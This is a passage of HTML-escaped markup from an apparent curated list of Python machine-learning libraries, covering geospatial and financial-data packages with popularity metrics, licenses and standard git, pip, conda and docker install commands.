href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pysal/pysal&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 75 · 🔀 270 · 📋 610 - 1% open · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pysal/pysal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pysal&#34;&gt;PyPi&lt;/a&gt; (📥 19K / month · 📦 30 · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pysal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pysal&#34;&gt;Conda&lt;/a&gt; (📥 440K · ⏱️ 31.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pysal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/holoviz/geoviews&#34;&gt;GeoViews&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 410) - Simple, concise geographical visualization in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/holoviz/geoviews&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 27 · 🔀 68 · 📋 300 - 34% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/holoviz/geoviews&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/geoviews&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 26 · ⏱️ 08.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install geoviews&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/geoviews&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 08.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge geoviews&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/earthlab/earthpy&#34;&gt;EarthPy&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 360) - A package built to support working with spatial data using open source.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/earthlab/earthpy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 40 · 🔀 140 · 📦 140 · 📋 220 - 8% open · ⏱️ 20.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/earthlab/earthpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/earthpy&#34;&gt;PyPi&lt;/a&gt; (📥 7.8K / month · 📦 7 · ⏱️ 01.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install earthpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/earthpy&#34;&gt;Conda&lt;/a&gt; (📥 43K · ⏱️ 04.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge earthpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 8 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/DenisCarriere/geocoder&#34;&gt;Geocoder&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 1.4K · 💀) - Python Geocoder. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytroll/satpy&#34;&gt;Satpy&lt;/a&gt;&lt;/b&gt; (🥉30 · ⭐ 840) - Python package for earth-observing satellite data processing. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/sentinelsat/sentinelsat&#34;&gt;Sentinelsat&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 760) - Search and download Copernicus Sentinel satellite images. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pbugnion/gmaps&#34;&gt;gmaps&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 740 · 💀) - Google maps for Jupyter notebooks. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mapbox/mapboxgl-jupyter&#34;&gt;Mapbox GL&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 610 · 💀) - Use Mapbox GL JS to visualize data in a Python Jupyter notebook. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/geospace-code/pymap3d&#34;&gt;pymap3d&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 250) - pure-Python (Numpy optional) 3D coordinate conversions for geospace ecef.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/andrea-cuttone/geoplotlib&#34;&gt;geoplotlib&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 960 · 💀) - python toolbox for visualizing geographical data and making maps. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/marceloprates/prettymaps&#34;&gt;prettymaps&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 8K) - A small set of Python functions to draw pretty maps from.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Financial Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for algorithmic stock/crypto trading, risk analytics, backtesting, technical analysis, and other tasks on financial data.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ranaroussi/yfinance&#34;&gt;yfinance&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 7.1K) - Download market data from Yahoo! Finances API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ranaroussi/yfinance&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 53 · 🔀 1.5K · 📦 12K · 📋 780 - 56% open · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ranaroussi/yfinance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/yfinance&#34;&gt;PyPi&lt;/a&gt; (📥 330K / month · 📦 120 · ⏱️ 30.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install yfinance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/ranaroussi/yfinance&#34;&gt;Conda&lt;/a&gt; (📥 43K · ⏱️ 10.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c ranaroussi yfinance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/qlib&#34;&gt;Qlib&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 8.6K) - Qlib is an AI-oriented quantitative investment platform, which aims to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/qlib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 94 · 🔀 1.5K · 📥 280 · 📦 17 · 📋 550 - 29% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/qlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyqlib&#34;&gt;PyPi&lt;/a&gt; (📥 2.7K / month · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyqlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bukosabino/ta&#34;&gt;ta&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 3K) - Technical Analysis Library using Pandas and Numpy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bukosabino/ta&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 28 · 🔀 700 · 📦 1.2K · 📋 210 - 53% open · ⏱️ 24.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bukosabino/ta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ta&#34;&gt;PyPi&lt;/a&gt; (📥 76K / month · 📦 33 · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ta&#34;&gt;Conda&lt;/a&gt; (📥 3.1K · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/RomelTorres/alpha_vantage&#34;&gt;Alpha Vantage&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 3.6K · 💤) - A python wrapper for Alpha Vantage API for financial data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/RomelTorres/alpha_vantage&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 39 · 🔀 640 · 📋 260 - 5% open · ⏱️ 14.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/RomelTorres/alpha_vantage&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/alpha_vantage&#34;&gt;PyPi&lt;/a&gt; (📥 15K / month · 📦 100 · ⏱️ 26.08.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install alpha_vantage&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/alpha_vantage&#34;&gt;Conda&lt;/a&gt; (📥 1.2K · ⏱️ 14.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge alpha_vantage&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/erdewit/ib_insync&#34;&gt;IB-insync&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.8K) - Python sync/async framework for Interactive Brokers API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/erdewit/ib_insync&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 30 · 🔀 480 · 📋 400 - 1% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/erdewit/ib_insync&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ib_insync&#34;&gt;PyPi&lt;/a&gt; (📥 6.6K / month · 📦 19 · ⏱️ 28.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ib_insync&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ib-insync&#34;&gt;Conda&lt;/a&gt; (📥 16K · ⏱️ 29.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ib-insync&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pmorissette/ffn&#34;&gt;ffn&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.1K · 📈) - ffn - a financial function library for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pmorissette/ffn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 26 · 🔀 200 · 📦 200 · 📋 97 - 17% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pmorissette/ffn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ffn&#34;&gt;PyPi&lt;/a&gt; (📥 29K / month · 📦 25 · ⏱️ 21.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ffn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ffn&#34;&gt;Conda&lt;/a&gt; (📥 840 · ⏱️ 22.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ffn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pmorissette/bt&#34;&gt;bt&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.4K) - bt - flexible backtesting for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pmorissette/bt&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 310 · 📦 110 · 📋 280 - 19% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pmorissette/bt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/bt&#34;&gt;PyPi&lt;/a&gt; (📥 4.4K / month · 📦 21 · ⏱️ 21.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install bt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/bt&#34;&gt;Conda&lt;/a&gt; (📥 4.3K · ⏱️ 18.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge bt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensortrade-org/tensortrade&#34;&gt;TensorTrade&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 3.9K) - An open source reinforcement learning framework for training,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensortrade-org/tensortrade&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 61 · 🔀 880 · 📦 36 · 📋 230 - 14% open · ⏱️ 02.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensortrade-org/tensortrade&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensortrade&#34;&gt;PyPi&lt;/a&gt; (📥 550 / month · 📦 1 · ⏱️ 10.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensortrade&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensortrade&#34;&gt;Conda&lt;/a&gt; (📥 1.1K · ⏱️ 10.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensortrade&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scrtlabs/catalyst&#34;&gt;Enigma Catalyst&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 2.3K · 💤) - An Algorithmic Trading Library for Crypto-Assets in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scrtlabs/catalyst&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 700 · 📦 24 · 📋 490 - 27% open · ⏱️ 22.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scrtlabs/catalyst&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/enigma-catalyst&#34;&gt;PyPi&lt;/a&gt; (📥 560 / month · 📦 2 · ⏱️ 11.11.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install enigma-catalyst&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jealous/stockstats&#34;&gt;stockstats&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 990) - Supply a wrapper ``StockDataFrame`` based on the.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jealous/stockstats&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 8 · 🔀 260 · 📦 460 · 📋 85 - 9% open · ⏱️ 07.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jealous/stockstats&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/stockstats&#34;&gt;PyPi&lt;/a&gt; (📥 8.2K / month · 📦 29 · ⏱️ 07.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install stockstats&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google/tf-quant-finance&#34;&gt;tf-quant-finance&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 3.1K) - High-performance TensorFlow library for quantitative.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google/tf-quant-finance&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 39 · 🔀 420 · 📋 44 - 50% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google/tf-quant-finance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tf-quant-finance&#34;&gt;PyPi&lt;/a&gt; (📥 1.3K / month · 📦 2 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tf-quant-finance&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/CryptoSignal/Crypto-Signal&#34;&gt;Crypto Signals&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 4K · 💤) - Github.com/CryptoSignal - #1 Quant Trading &amp;amp; Technical.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/CryptoSignal/Crypto-Signal&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 28 · 🔀 1K · 📋 260 - 20% open · ⏱️ 28.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/CryptoSignal/crypto-signal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/shadowreaver/crypto-signal&#34;&gt;Docker Hub&lt;/a&gt; (📥 140K · ⭐ 7 · ⏱️ 03.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull shadowreaver/crypto-signal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cuemacro/finmarketpy&#34;&gt;finmarketpy&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 2.9K) - Python library for backtesting trading strategies &amp;amp; analyzing.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cuemacro/finmarketpy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 450 · 📥 40 · 📦 5 · 📋 26 - 88% open · ⏱️ 05.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cuemacro/finmarketpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/finmarketpy&#34;&gt;PyPi&lt;/a&gt; (📥 110 / month · ⏱️ 07.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install finmarketpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 12 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/quantopian/zipline&#34;&gt;zipline&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 15K · 💀) - Zipline, a Pythonic Algorithmic Trading Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mementum/backtrader&#34;&gt;backtrader&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 8.8K · 💤) - Python Backtesting library for trading strategies. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/quantopian/pyfolio&#34;&gt;pyfolio&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 4.4K · 💀) - Portfolio and risk analytics in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a 